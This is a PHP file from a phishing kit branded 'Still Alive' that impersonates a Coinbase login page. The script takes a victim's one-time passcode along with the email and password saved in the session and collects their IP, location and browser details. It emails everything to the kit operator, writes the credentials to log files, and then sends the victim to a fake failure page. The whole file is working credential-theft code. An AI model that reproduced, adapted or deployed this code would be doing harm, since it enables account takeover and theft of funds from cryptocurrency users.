<?php
/*
 ____    __         ___    ___       ______   ___                          
/\  _`\ /\ \__  __ /\_ \  /\_ \     /\  _  \ /\_ \    __                   
\ \,\L\_\ \ ,_\/\_\\//\ \ \//\ \    \ \ \L\ \\//\ \  /\_\  __  __     __   
 \/_\__ \\ \ \/\/\ \ \ \ \  \ \ \    \ \  __ \ \ \ \ \/\ \/\ \/\ \  /'__`\ 
   /\ \L\ \ \ \_\ \ \ \_\ \_ \_\ \_   \ \ \/\ \ \_\ \_\ \ \ \ \_/ |/\  __/ 
   \ `\____\ \__\\ \_\/\____\/\____\   \ \_\ \_\/\____\\ \_\ \___/ \ \____\
    \/_____/\/__/ \/_/\/____/\/____/    \/_/\/_/\/____/ \/_/\/__/   \/____/

 * @Facebook: https://www.facebook.com/ownerstillalive/
*/
session_start();
error_reporting(0);
require "../../function.php";
require "../../config.php";
$otp1 = $_POST['otp1'];
$otp2 = $_POST['otp2'];
$otp3 = $_POST['otp3'];
$otp4 = $_POST['otp4'];
$otp5 = $_POST['otp5'];
$otp6 = $_POST['otp6'];

$from = $senderemail;
$headers = "From: AUTH 5 - $senderlogin <$from>";
$subject = "Coinbase Login AUTH 5 [ $ip - $cn - $br - $os ]";
$to = $stillalive;
$data = "
.++======[ Coinbase Login - Powered By Still Alive ]======++.

    .++=====[ AUTH Coinbase ]=====++.
AUTH       :   $otp1 $otp2 $otp3 $otp4 $otp5 $otp6
        .++===[ End ]===++.

    .++=====[ PC Info ]=====++.
IP Address  :   $ip
ISP         :   $isp
Region      :   $regioncity
City        :   $citykota
Continent   :   $continent
OS/Browser  :   $br / $os On $date
User Agent  :   $user_agent
        .++===[ End ]===++.

.++======[ Powered By Still Alive - Coinbase Login ]======++.
";
mail($to,$subject,$data,$headers);
$empas   = "".$_SESSION['email']."|".$_SESSION['password']."|$otp1 $otp2 $otp3 $otp4 $otp5 $otp6|$cn\n";
$file1 = "../logs/stillalive-accotp.txt";
$isi1  = @file_get_contents($file1);
$buka1 = fopen($file1,"a");
fwrite($buka1, $empas);
fclose($buka1);
    
$file2 = "../logs/stillalive-loginotp.txt";
$isi  = @file_get_contents($file2);
$buka = fopen($file2,"w"); 
fwrite($buka, $isi+1);
fclose($buka);
    
$cadangan = "../logs/login-info.txt";
$filecadangan = @fopen($cadangan, 'a+');
@fwrite($filecadangan, $data);
@fclose($filecadangan); //Cadangan kalo send username gak work
HEADER("Location: ./failed-oauth");
?>